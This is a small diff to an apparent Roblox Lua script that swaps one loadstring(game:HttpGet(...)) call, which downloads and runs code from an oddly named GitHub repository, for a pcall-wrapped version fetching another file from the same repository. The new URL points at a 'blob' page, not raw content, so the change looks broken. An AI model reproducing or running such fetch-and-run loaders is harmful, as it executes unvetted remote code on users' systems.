@@ -1,1 +1,10 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/84wbhtuwign8wagb7/tfnfgnfgnfgnf/main/ipfdio"))()
+local success, result = pcall(function()
+    loadstring(game:HttpGet("https://github.com/84wbhtuwign8wagb7/tfnfgnfgnfgnf/blob/main/vrdesv"))()
+end)
+
+if success then
+    print("Script executed successfully.")
+else
+    print("An error occurred while running the script:")
+    print(result)
+end
